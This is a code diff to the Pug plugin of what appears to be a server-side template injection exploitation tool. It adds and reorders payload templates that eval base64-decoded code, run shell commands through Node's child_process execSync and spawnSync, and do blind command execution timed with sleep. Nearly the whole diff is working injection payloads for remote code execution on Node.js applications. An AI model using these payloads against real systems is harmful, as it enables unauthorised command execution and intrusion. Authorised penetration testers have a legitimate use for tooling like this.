@@ -31,6 +31,39 @@ class Pug(javascript.Javascript):
                 'header': """\n= ''['x'][({header[0]}+{header[1]}).toString()+""",
                 'trailer': """+({trailer[0]}+{trailer[1]}).toString()]\n""",
             },
+            'evaluate': {
+                'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
+                'test_os': """global.process.mainModule.require('os').platform()"""
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """0\n- x = [""]\n- x[0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]\n"""
+            },
+            'execute': {
+                'call': 'render',
+                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_error': {
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            # Not using execute here since it's rendered and requires set headers and trailers
+            'execute_blind': {
+                'call': 'inject',
+                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
+                # TODO: use another function.
+                # Payloads calling inject must start with \n to break out already started lines
+                # It's two lines command to avoid false positive with Javascript module
+                'execute_blind': """\n- x = global.process.mainModule.require\n- x('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')\n"""
+            },
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write': {
                 'call': 'inject',
@@ -51,37 +84,6 @@ class Pug(javascript.Javascript):
             },
             'md5_error': {
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
-            },
-            'blind': {
-                'call': 'execute_blind',
-                'test_bool_true': 'true',
-                'test_bool_false': 'false'
-            },
-            # Not using execute here since it's rendered and requires set headers and trailers
-            'execute_blind': {
-                'call': 'inject',
-                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
-                # TODO: use another function.
-                # Payloads calling inject must start with \n to break out already started lines
-                # It's two lines command to avoid false positive with Javascript module
-                'execute_blind': """
-- x = global.process.mainModule.require
-- x('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')
-"""
-            },
-            'execute': {
-                'call': 'render',
-                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
-            },
-            'execute_error': {
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
-            },
-            'evaluate': {
-                'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
-                'test_os': """global.process.mainModule.require('os').platform()"""
-            },
-            'evaluate_error': {
-                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
             },
         })
 
